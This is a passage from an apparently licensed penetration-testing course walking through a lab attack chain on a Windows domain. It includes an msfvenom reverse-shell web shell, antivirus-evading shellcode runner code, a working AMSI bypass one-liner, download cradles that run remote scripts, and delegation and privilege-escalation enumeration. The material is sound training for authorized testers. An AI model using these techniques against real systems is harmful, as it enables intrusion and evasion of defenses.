We will walk through a fairly simple case study containing three networked machines but as we 
will discover, attack chaining is rarely simple. We will also use a virtual development machine for 
information gathering, testing, and code development, which is common during a penetration 
test. 
17.1 Enumeration and Shell 
In most cases, a firewall will block our access to the internal network, blocking access to 
everything except publicly-available services like web and email servers. This leaves us with two 
common avenues of attack: social engineering through email or a server-side attack. 
If our client has no preference, we would perform enumeration to determine the best approach. 
In a real-world test, we will often begin enumeration with open source intelligence gathering and 
exploration of publicly-available resources. 
However, we have made some simplifications for this module. The target network only consists 
of three machines and we have not installed a firewall between our Kali machine and the target 
machines. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
669 
In addition, we will be skipping many aspects of the often-extensive open source reconnaissance 
and information gathering phases, which are difficult to recreate in this environment. 
17.1.1 
Initial Enumeration 
Let’s begin with basic reconnaissance. When we scan real-world targets with tools like network 
scanners and web crawlers, it’s generally considered good practice to execute them in as limited 
a scope as possible to avoid overloading any systems. 
Since we are only dealing with three systems (192.168.120.130-132), we’ll scan the top 1000 
ports with nmap: 
kali@kali:~$ sudo nmap -A -Pn 192.168.120.130-132 
Starting Nmap 7.80 ( https://nmap.org ) 
Nmap scan report for 192.168.120.130 
Host is up (0.12s latency). 
Not shown: 987 filtered ports 
PORT     STATE SERVICE       VERSION 
53/tcp   open  domain? 
| fingerprint-strings:  
|   DNSVersionBindReqTCP:  
|     version 
|_    bind 
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-24 
18:11:25Z) 
135/tcp  open  msrpc         Microsoft Windows RPC 
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn 
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: 
evil.com0., Site: Default-First-Site-Name) 
445/tcp  open  microsoft-ds? 
464/tcp  open  kpasswd5? 
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0 
636/tcp  open  tcpwrapped 
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: 
evil.com0., Site: Default-First-Site-Name) 
3269/tcp open  tcpwrapped 
3389/tcp open  ms-wbt-server Microsoft Terminal Services 
| rdp-ntlm-info:  
|   Target_Name: EVIL 
|   NetBIOS_Domain_Name: EVIL 
|   NetBIOS_Computer_Name: DC02 
|   DNS_Domain_Name: evil.com 
|   DNS_Computer_Name: dc02.evil.com 
... 
Nmap scan report for 192.168.120.131 
Host is up (0.12s latency). 
Not shown: 996 filtered ports 
PORT     STATE SERVICE       VERSION 
135/tcp  open  msrpc         Microsoft Windows RPC 
445/tcp  open  microsoft-ds? 
3389/tcp open  ms-wbt-server Microsoft Terminal Services 
| rdp-ntlm-info:  
|   Target_Name: EVIL 
|   NetBIOS_Domain_Name: EVIL 
|   NetBIOS_Computer_Name: FILE01 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
670 
|   DNS_Domain_Name: evil.com 
|   DNS_Computer_Name: file01.evil.com 
... 
Nmap scan report for 192.168.120.132 
Host is up (0.12s latency). 
Not shown: 997 filtered ports 
PORT     STATE SERVICE       VERSION 
80/tcp   open  http          Microsoft IIS httpd 10.0 
| http-methods:  
|_  Potentially risky methods: TRACE 
|_http-server-header: Microsoft-IIS/10.0 
| http-title:  
|   title: \x0D 
|_\x0D 
3389/tcp open  ms-wbt-server Microsoft Terminal Services 
| rdp-ntlm-info:  
|   Target_Name: EVIL 
|   NetBIOS_Domain_Name: EVIL 
|   NetBIOS_Computer_Name: WEB01 
|   DNS_Domain_Name: evil.com 
|   DNS_Computer_Name: web01.evil.com 
... 
Listing 875 - Truncated results from Nmap scan of the targets 
The output shown in Listing 875 indicates that we are dealing with a Windows environment, and 
specifically an Active Directory infrastructure containing an “evil.com” domain and a DC02 host 
acting as the domain controller. In addition, the scan reveals two servers named web01 and 
file01. 
Remote Desktop is running on all three targets and although we could brute-force them, this is 
not a common find during an external penetration test. However, web01 exposes access to an IIS 
web server on TCP port 80, which is a more appropriate first vector for our case study. 
Let’s begin by browsing the web server. 
 
Figure 249: Web application on port 80 of web01 
As shown in Figure 249, this web application allows file uploads. If configured incorrectly, this 
could provide the initial foothold we need. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
671 
 
Admittedly, a web site that allows unauthenticated file uploads is rather 
unrealistic. However, there are innumerable initial vectors and the primary focus 
of this module is chaining attacks and putting together the concepts we have 
discussed in previous modules. 
Since we are targeting so few machines, we will pause our enumeration to focus on this potential 
vulnerability. 
17.1.1.1 Exercises 
1. 
Perform enumeration against the three hosts. 
2. 
Access the web service published by web01 and find the file upload application. 
17.1.2 
Gaining an Initial Foothold 
Now that we’ve found a potential attack vector, let’s attempt to exploit it. First, we must determine 
the parsing engine that is used, and the file upload location. Let’s inspect the HTML code. 
<!DOCTYPE html> 
 
<html xmlns="http://www.w3.org/1999/xhtml"> 
<head><title> 
 
</title></head> 
<body> 
    <form method="post" action="./" id="form1" enctype="multipart/form-data"> 
<div class="aspNetHidden"> 
... 
Listing 876 - HTML source shows use of .NET 
According to the output in Listing 876, the application is using .NET. 
Let’s create a dummy .NET file with the aspx extension. 
<%@ Page Language="C#" %> 
<script runat="server"> 
</script> 
Listing 877 - Simple aspx file to test with 
The code shown in Listing 877 specifies that we intend to use C# inside the script tags. Since 
there is no code between the tags, nothing will execute, but initially we’ll simply upload it through 
the web interface and attempt to access it from the web root directory. If the file is written to the 
web root or a subdirectory that does not require authentication, we can trick the web server into 
executing it which, in this case, should result in a blank page. 
Let’s upload the file and attempt to browse to it. 
Server Error in '/' Application. 
The resource cannot be found. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
672 
Description: HTTP 404. The resource you are looking for (or one of its dependencies) 
could have been removed, had its name changed, or is temporarily unavailable.  Please 
review the following URL and make sure that it is spelled correctly. 
 
Requested URL: /test.aspx 
Listing 878 - Browsing to test.aspx in the web root does not work 
Unfortunately, this produces a “not found” message. Let’s enumerate subfolders on the web 
server and attempt to invoke our code from there. We’ll use Gobuster,1006 which is faster for this 
simple task than other tools such as dirb.1007 
First, we need to install Gobuster on our Kali machine: 
kali@kali:~$ sudo apt install gobuster -y 
... 
Listing 879 - Installing Gobuster 
Next, we’ll execute it with the dir option to search for directories along with the -e flag to display 
full URI paths. We’ll also provide the target URL (-u) and wordlist file (-w</.pr>). 
kali@kali:~$ gobuster dir -e -u http://192.168.120.132/ -w 
/usr/share/wordlists/dirb/common.txt  
=============================================================== 
Gobuster v3.0.1 
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) 
=============================================================== 
[+] Url:            http://192.168.120.132/ 
[+] Threads:        10 
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt 
[+] Status codes:   200,204,301,302,307,401,403 
[+] User Agent:     gobuster/3.0.1 
[+] Expanded:       true 
[+] Timeout:        10s 
=============================================================== 
2020/06/25 02:35:20 Starting gobuster 
=============================================================== 
http://192.168.120.132/aspnet_client (Status: 301) 
http://192.168.120.132/upload (Status: 301) 
=============================================================== 
2020/06/25 02:36:15 Finished 
=============================================================== 
Listing 880 - Gobuster results against web01 
Our enumeration only returned the custom /upload subdirectory. When we browse to 
/upload/test.aspx, we receive a blank page, likely indicating that our code is running. 
The attack from here is relatively straightforward. We can simply generate an aspx web shell with 
msfvenom that contains a Meterpreter reverse shell, upload it through the application, and browse 
to it under upload. This should trigger execution and grant us a reverse shell. 
 
1006 (OJ Reeves, 2020), https://github.com/OJ/gobuster 
1007 (Kali, 2020), https://tools.kali.org/web-applications/dirbuster 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
673 
kali@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 
LPORT=443 -f aspx -o /home/kali/met.aspx 
... 
Payload size: 691 bytes 
Final size of aspx file: 4584 bytes 
Saved as: /home/kali/met.aspx 
Listing 881 - ASPX web shell is generated with msfvenom 
Next, we’ll set up a Metasploit multi/handler, upload our shell as met.aspx, and attempt to browse 
to it. 
Server Error in '/Upload' Application. 
Could not load file or assembly 
'file:///C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET 
Files\upload\4fd4a6be\2a870af3\App_Web_met.aspx.cdcab7d2.e86ytam7.dll' or one of its 
dependencies. Operation did not complete successfully because the file contains a 
virus or potentially unwanted software. (Exception from HRESULT: 0x800700E1) 
Description: An unhandled exception occurred during the execution of the current web 
request. Please review the stack trace for more information about the error and where 
it originated in the code. 
... 
Listing 882 - Antivirus has deleted the web shell 
However, we don’t receive a shell, and the browser displays the error message shown in Listing 
882. This clearly indicates the presence of antivirus software that’s flagging our web shell. 
Windows servers commonly run some form of antivirus, unlike most Linux 
servers. 
Our next step is to attempt to bypass the antivirus protection using the skills we discussed in this 
course. To begin, we’ll open met.aspx in an attempt to determine why it’s flagging. 
<%@ Page Language="C#" AutoEventWireup="true" %> 
<%@ Import Namespace="System.IO" %> 
<script runat="server"> 
    private static Int32 MEM_COMMIT=0x1000; 
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40; 
 
    [System.Runtime.InteropServices.DllImport("kernel32")] 
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 
flAllocationType,IntPtr flProtect); 
 
    [System.Runtime.InteropServices.DllImport("kernel32")] 
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr 
dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr 
lpThreadId); 
 
    protected void Page_Load(object sender, EventArgs e) 
    { 
        byte[] vL8fwOy_ = new byte[691] { 0xfc,0x48,0x83,0xe4,0xf0,... }; 
 
        IntPtr uPR9CPj_b7 = 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
674 
VirtualAlloc(IntPtr.Zero,(UIntPtr)vL8fwOy_.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
        
System.Runtime.InteropServices.Marshal.Copy(vL8fwOy_,0,uPR9CPj_b7,vL8fwOy_.Length); 
        IntPtr graLqi = IntPtr.Zero; 
        IntPtr vn4FD0Agd = 
CreateThread(IntPtr.Zero,UIntPtr.Zero,uPR9CPj_b7,IntPtr.Zero,0,ref graLqi); 
    } 
</script> 
Listing 883 - Partial contents of met.aspx 
The truncated content of met.aspx matches our previously-developed basic C# shellcode runner. 
As we know from previous efforts, this code is flagged by both signature and heuristics scans. 
Fortunately, we developed an efficient bypass. We’ll use a non-emulated API and encrypt the 
Meterpreter shellcode with a simple Caesar cipher. 
Since we previously developed code for these techniques, we can refer back to our previous 
Visual Studio projects and quickly incorporate them into this web shell. 
First, we’ll copy the DllImport statements needed for VirtualAllocExNuma and GetCurrentProcess 
along with the code to call VirtualAllocExNuma and parse its return value: 
... 
[System.Runtime.InteropServices.DllImport("kernel32")] 
private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr 
dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr 
lpThreadId); 
 
[System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, 
ExactSpelling = true)] 
private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, 
uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred); 
 
[System.Runtime.InteropServices.DllImport("kernel32.dll")] 
private static extern IntPtr GetCurrentProcess(); 
 
protected void Page_Load(object sender, EventArgs e) 
{ 
    IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 
0x4, 0); 
    if(mem == null) 
    { 
        return; 
    } 
... 
Listing 884 - Code to bypass heuristics detection 
Since the web shell does not import the System.Runtime.InteropServices namespace at a global 
level, we’ll include it in each import statement. 
Now we’ll use our previously-developed code to encrypt the shellcode and arbitrarily use “5” as the 
Caesar cipher key. 
byte[] buf = new byte[691] { 0xfc,0x48,0x83,0xe4,0xf0,... }; 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
675 
byte[] encoded = new byte[buf.Length]; 
for (int i = 0; i < buf.Length; i++) 
{ 
    encoded[i] = (byte)(((uint)buf[i] + 5) & 0xFF); 
} 
 
StringBuilder hex = new StringBuilder(encoded.Length * 2); 
foreach (byte b in encoded) 
{ 
    hex.AppendFormat("0x{0:x2}, ", b); 
} 
 
Console.WriteLine("The payload is: " + hex.ToString()); 
Listing 885 - C# code to encrypt the shellcode 
Now we can execute the encryption code and copy the encrypted shellcode into the web shell. 
We’ll also add the corresponding decrypting routine as shown in Listing 886. 
... 
IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 
0); 
if(mem == null) 
{ 
    return; 
} 
 
byte[] vL8fwOy_ = new byte[691] { 0x01, 0x4d, 0x88, ... }; 
 
 
for(int i = 0; i < vL8fwOy_.Length; i++) 
{ 
    vL8fwOy_[i] = (byte)(((uint)vL8fwOy_[i] - 5) & 0xFF); 
} 
 
IntPtr uPR9CPj_b7 = VirtualAlloc(IntPtr.Zero,(UIntPtr)vL8fwOy_.Length,MEM_COMMIT, 
PAGE_EXECUTE_READWRITE); 
System.Runtime.InteropServices.Marshal.Copy(vL8fwOy_,0,uPR9CPj_b7,vL8fwOy_.Length); 
IntPtr graLqi = IntPtr.Zero; 
IntPtr vE3FMd = CreateThread(IntPtr.Zero,UIntPtr.Zero,uPR9CPj_b7,IntPtr.Zero,0,ref 
graLqi); 
... 
Listing 886 - Decrypting routine is inserted into the code 
With all the antivirus bypass code implemented in the web shell, we can upload it through the web 
form and execute it. 
msf5 exploit(multi/handler) > exploit 
 
[*] Started HTTPS reverse handler on https://192.168.119.120:443 
[*] https://192.168.119.120:443 handling request from 192.168.120.132; (UUID: 
ftkiispt) Staging x64 payload (207449 bytes) ... 
[*] Meterpreter session 1 opened (192.168.119.120:443 -> 192.168.120.132:50098) 
 
meterpreter > getuid 
Server username: IIS APPPOOL\DefaultAppPool 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
676 
 
meterpreter > sysinfo 
Computer        : WEB01 
OS              : Windows 2016+ (10.0 Build 17763). 
Architecture    : x64 
System Language : en_US 
Domain          : EVIL 
Logged On Users : 7 
Meterpreter     : x64/windows 
Listing 887 - Reverse Meterpreter shell 
This successfully bypasses the AV and yields us a reverse shell. From the output of the getuid 
and sysinfo commands, we find that the shell executed in the context of the default IIS service 
account (DefaultAppPool) on the WEB01 host in the EVIL domain. 
17.1.2.1 Exercises 
1. 
Perform enumeration to detect the upload folder. 
2. 
Attempt to use a generic web shell with a Meterpreter payload to obtain a reverse shell. 
3. 
Use the AV bypass techniques to evade detection. 
17.1.3 
Post Exploitation Enumeration 
Now that we have obtained a reverse shell, we’ll perform some post exploitation enumeration, 
both to get an idea of which attack paths are possible from here, but also to figure out which 
security mitigations we are up against. 
The output from our previous sysinfo command (in Listing 887) reveals that the OS version is 
reported as “Windows 2016+”, but the build number of 17763 tells the full story. Windows Server 
2016 and 2019 both build on the Windows 10 codebase and there have been numerous 
releases.1008 In essence, the build number 17763 equates to Windows 10 version 1809 or 
Windows Server 2019. 
Armed with this information, we can attempt privilege escalation, but first we have to make some 
quality-of-life improvements since this shell is not ideal. 
The primary issue here is that our initial Meterpreter shell is based on the aspx web shell, which 
means our shell will die if the web worker process times out. We can solve this by migrating our 
shell to a different process. 
Normally, we could migrate to a process like explorer.exe, but since the IIS service account uses a 
non-interactive logon, the explorer.exe process does not exist in this context. 
In fact, the only process running as the DefaultAppPool user is the web worker. To solve this, we 
can create a hidden instance of Notepad and migrate into it: 
meterpreter > execute -H -f notepad 
Process 620 created. 
 
 
1008 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Windows_10_version_history 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
677 
meterpreter > migrate 620 
[*] Migrating from 508 to 620... 
[*] Migration completed successfully. 
Listing 888 - Migrating into notepad 
With this more stable shell, we can start our post-exploitation enumeration. We already know that 
antivirus is present on this machine, but we would like to determine which product is in place in 
order to simplify our bypass attempt. We also need to know if the antivirus supports AMSI. 
We can use the PowerShell HostRecon1009 script to detect a multitude of host-based settings and 
information. Since this is a PowerShell script, we’ll use Meterpreter’s shell to open a command 
prompt, which we can convert to PowerShell. 
Next, we’ll download the HostRecon.ps1 PowerShell script from our Kali web server and load it 
into memory with a download cradle: 
meterpreter > shell 
Process 3000 created. 
Channel 1 created. 
Microsoft Windows [Version 10.0.17763.1282] 
(c) 2018 Microsoft Corporation. All rights reserved. 
 
c:\windows\system32\inetsrv> powershell 
powershell 
Windows PowerShell  
Copyright (C) Microsoft Corporation. All rights reserved. 
 
PS C:\windows\system32\inetsrv> (new-object 
system.net.webclient).downloadstring('http://192.168.119.120/HostRecon.ps1') | IEX 
(new-object 
system.net.webclient).downloadstring('http://192.168.119.120/HostRecon.ps1') | IEX 
Listing 889 - Downloading and loading HostRecon.ps1 
We automatically bypass the PowerShell execution policy with the Invoke-Expression (IEX) cmdlet 
and execute the Invoke-HostRecon function. 
PS C:\windows\system32\inetsrv> Invoke-HostRecon 
Invoke-HostRecon 
[*] Hostname 
WEB01 
... 
[*] Current Domain and Username 
Domain = IIS APPPOOL 
Current User = DefaultAppPool 
... 
[*] Checking local firewall status. 
The local firewall appears to be enabled. 
... 
[*] Checking for Local Admin Password Solution (LAPS) 
The LAPS DLL was not found. 
... 
[*] Checking for common security product processes 
 
1009 (@dafthack, 2020), https://github.com/dafthack/HostRecon 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
678 
Possible Windows Defender AV process MsMpEng is running. 
... 
Listing 890 - Truncated output from Invoke-HostRecon 
The truncated output reveals that the antivirus engine is likely Windows Defender, which employs 
AMSI. Furthermore, it does not appear that LAPS is in use. 
Next, we’ll check the RunAsPPL registry key to determine if LSA protection is enabled with the 
Get-ItemProperty cmdlet: 
PS C:\windows\system32\inetsrv> Get-ItemProperty -Path 
HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL" 
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL" 
 
RunAsPPL     : 1 
PSPath       : 
Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Contro
l\Lsa 
PSParentPath : 
Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Contro
l 
PSChildName  : Lsa 
PSDrive      : HKLM 
PSProvider   : Microsoft.PowerShell.Core\Registry 
Listing 891 - LSA protection is enabled 
LSA protection is indeed enabled, which means we cannot directly obtain NTLM hashes from 
LSASS. 
Finally, we need to determine if application whitelisting is in effect. We already know that 
Windows Defender is the antivirus product in use, which means that if application whitelisting is 
employed, it is likely through AppLocker. 
The AppLocker rules will typically be enforced through GPOs in an Active Directory environment, 
but they will be written to the registry and we can dump them with the PowerShell Get-
ChildItem cmdlet. 
PS C:\windows\system32\inetsrv> Get-ChildItem -Path 
HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe 
 
   Hive: HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe 
 
Name                           Property                                                             
----                           --------                                                             
5040b75a-f81a-4a07-a543-ee1129 Value : <FilePublisherRule Id="5040b75a-f81a-4a07-a543-
ee1129a15fe4" Name="Signed by     
a15fe4                         O=MICROSOFT CORPORATION,                                             
                                       L=REDMOND, S=WASHINGTON, C=US" Description="" 
UserOrGroupSid="S-1-1-0"           
                                       
Action="Allow"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT    
                               CORPORATION, L=REDMOND,                                              
                                       S=WASHINGTON, C=US" ProductName="*" 
BinaryName="*"><BinaryVersionRange           
                               LowSection="*"                                                       
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
679 
                                       
HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>      
... 
Listing 892 - AppLocker rules for executable files 
The truncated output shows that AppLocker is indeed in use and the rule only allows executables 
signed by Microsoft. 
This seems very formidable but AppLocker rules do not apply to the built-in local accounts such 
as Local System, Local Service, or Network Service. Neither do they apply to the IIS DefaultAppPool 
account, which means we only have to worry about AppLocker if we migrate into a process of a 
different user. 
Next, we want to perform post-exploitation enumeration against Active Directory to detect any 
possible attack avenues. PowerView excels at this, but due to its popularity, it will be detected by 
AMSI, which we can attempt to bypass. 
Based on our previous research, we know that we can corrupt the first four bytes of the 
amsiContext structure to turn off AMSI for the remainder of the PowerShell process runtime. 
Let’s reuse that code. 
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") 
{$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like 
"*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = 
@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1) 
Listing 893 - AMSI bypass code 
To use this bypass, we’ll save it to amsi.txt on our Kali web server and use a download cradle to 
execute it in memory. Once AMSI is disabled, we’ll also download PowerView and load it into 
memory as well. 
PS C:\windows\system32\inetsrv> (new-object 
system.net.webclient).downloadstring('http://192.168.119.120/amsi.txt') | IEX 
(new-object system.net.webclient).downloadstring('http://192.168.119.120/amsi.txt') | 
IEX 
 
PS C:\windows\system32\inetsrv> (new-object 
system.net.webclient).downloadstring('http://192.168.119.120/powerview.ps1') | IEX 
(new-object 
system.net.webclient).downloadstring('http://192.168.119.120/powerview.ps1') | IEX 
Listing 894 - Bypassing AMSI and loading PowerView 
Once PowerView is ready, we can begin our enumeration. For any large Active Directory 
infrastructure, this can be a lengthy task. However, in our smaller simulated penetration test, it is 
possible to perform the enumeration of Computers, Users, and Groups. Output from Get-
DomainComputer, Get-DomainUser, and Get-DomainGroup has not been included here as it does 
not directly provide any attack vectors. 
At the moment, our attack options are fairly limited since we only have access to a low-privileged 
account on a single server and no domain users are logged into it. 
Besides enumerating computers, users, and groups, we should also consider enumerating 
Kerberos delegation, including constrained delegation: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
680 
PS C:\windows\system32\inetsrv> Get-DomainComputer -TrustedToAuth 
Get-DomainComputer -TrustedToAuth 
... 
usncreated                    : 12780 
distinguishedname             : 
CN=WEB01,OU=EvilServers,OU=EvilComputers,DC=evil,DC=com 
objectguid                    : 9ea42104-7ebd-4d27-a31d-8d40ffcae127 
operatingsystem               : Windows Server 2019 Standard 
operatingsystemversion        : 10.0 (17763) 
lastlogoff                    : 12/31/1600 4:00:00 PM 
msds-allowedtodelegateto      : {cifs/file01.evil.com, cifs/FILE01} 
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=evil,DC=com 
dscorepropagationdata         : {6/18/2020 6:46:34 PM, 1/1/1601 12:00:00 AM} 
serviceprincipalname          : {WSMAN/web01, WSMAN/web01.evil.com, TERMSRV/WEB01, 
TERMSRV/web01.evil.com...} 
lastlogon                     : 6/25/2020 6:22:10 AM 
iscriticalsystemobject        : False 
usnchanged                    : 16514 
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, 
TRUSTED_TO_AUTH_FOR_DELEGATION 
whencreated                   : 6/18/2020 6:13:38 PM 
... 
Listing 895 - Locating constrained delegation 
The output indicates that the current computer (web01) is configured for constrained delegation 
to the CIFS service on file01. Furthermore, web01 has the TRUSTED_TO_AUTH_FOR_DELEGATION 
flag set, which means it can impersonate any user through the S4U protocol transition. 
If we can exploit the constrained delegation, we could compromise file01 and strengthen our 
foothold. 
Post-exploitation enumeration is important and in a penetration test against a real-world Active 
Directory infrastructure, this can take hours, if not days, to perform. Fortunately, in our small test 
environment this process moves relatively quickly. However, this process mirrors what we might 
see in a larger environment. 
17.1.3.1 Exercises 
1. 
Migrate the Meterpreter shell to a more stable process. 
2. 
Perform host-based enumeration to detect security solutions in place. Think about how that 
might impact us. 
3. 
Bypass AMSI, perform AD-related enumeration, and find the constrained delegation. 
17.2 Attacking Delegation 
Based on our enumeration, we know that web01 allows constrained delegation to file01. To 
exploit this, we are going to need the NTLM hash for web01, which in turn means that we’ll need 
to obtain higher privileges locally on the web server. 
Once we have the NTLM hash in hand, we can use the S4U protocol transition to request a 
forwardable TGS for the CIFS service on file01 in the context of an administrative user. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
681 
17.2.1 
Privilege Escalation on web01 
In this section, we’ll attempt to escalate our privileges to SYSTEM so that we can obtain the 
NTLM hash of the machine account. 
Since we compromised an IIS server and gained code execution as the IIS DefaultAppPool, we 
should have impersonation privileges. We can quickly check this with whoami. 
PS C:\windows\system32\inetsrv> whoami /priv 
whoami /priv 
 
PRIVILEGES INFORMATION 
---------------------- 
 
Privilege Name                Description                               State    
============================= ========================================= ======== 
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled 
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled 
SeAuditPrivilege              Generate security audits                  Disabled 
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled  
SeImpersonatePrivilege        Impersonate a client after authentication Enabled  
SeCreateGlobalPrivilege       Create global objects                     Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled 
Listing 896 - IIS DefaultAppPool has SeImpersonatePrivilege 
The output indicates that we have impersonation privileges. Since this is a Windows Server 2019 
machine, we can either use RoguePotato or PrintSpoofer to attempt to escalate our privileges. 
Given that RoguePotato requires access to a second machine and is generally more complex to 
execute, we’ll instead use PrintSpoofer. 
Note that Juicy Potato only works up to Windows Server 2016, FaxHell only 
works in the context of Network Service, and the Beans technique only works on 
desktop editions. 
To use PrintSpoofer, we can download the Visual Studio project and compile it. Unfortunately, if 
we upload and execute PrintSpoofer, even to just display the help menu, Windows Defender flags 
it. 
Since PrintSpoofer is written in C++, we can use the Invoke-ReflectivePEInjection PowerShell 
script to bypass antivirus as long as we disable AMSI. However, invoking an executable through 
reflection can be tricky, especially when it requires arguments. 
As an alternative, we can use our custom-coded PrintSpooferNet implementation that we 
developed in a previous module. Since this is custom-coded, it will likely evade detection. 
One caveat of this procedure is that PrintSpoofer bundles both the pipe server and the printer bug 
in a single application, while our custom implementation requires SpoolSample. Luckily, Windows 
Defender does not detect SpoolSample. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
682 
Before we start the attack, we must discuss another issue. When we previously developed the 
PrintSpooferNet code, we executed it from an interactive logon session.1010 In this case, we must 
execute it in the context of the service account that has not logged in. 
Because of the non-interactive logon session, when we invoke CreateProcessWithTokenW after 
having impersonated the SYSTEM account, the new process will immediately terminate. To solve 
this, we have to modify the code, revisit some of the API arguments, and introduce a number of 
concepts. 
First, one of the arguments for CreateProcessWithTokenW (lpEnvironment) is an environment 
block array that contains metadata related to the user and a startup directory. In our previous 
attacks, we used NULL for this argument, as the newly created process used an environment 
created from the profile of the logged on user. In this case, since the service account did not 
perform an interactive logon, we have to provide an environment block. 
Second, the lpCurrentDirectory argument, which specifies the initial drive and working directory for 
our shell, also needs to be specified for the same reasons as explained above. 
We can generate the values for these parameters with the CreateEnvironmentBlock1011 and 
GetSystemDirectory1012 APIs, respectively. 
The function prototype for CreateEnvironmentBlock is shown in Listing 897. 
BOOL CreateEnvironmentBlock( 
  LPVOID *lpEnvironment, 
  HANDLE hToken, 
  BOOL   bInherit 
); 
Listing 897 - Function prototype for CreateEnvironmentBlock 
CreateEnvironmentBlock accepts three parameters. The first is *lpEnvironment, which is an output 
pointer to the created environment block. The second argument (hToken) is the user token. In our 
case, this is the SYSTEM token after the successful privilege escalation. The third (bInherit) is a 
flag to signal whether to inherit from the current process’ environment. As the current process 
does not have an environment, we must set it to false. 
The function prototype for GetSystemDirectory shown in Listing 898 is even simpler. 
UINT GetSystemDirectoryW( 
  LPWSTR lpBuffer, 
  UINT   uSize 
); 
Listing 898 - Function prototype for GetSystemDirectoryW 
GetSystemDirectory accepts a string buffer (lpBuffer) that will be populated with the system 
directory along with the maximum allowed size (uSize) of the string. 
 
1010 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/secauthn/lsa-logon-sessions 
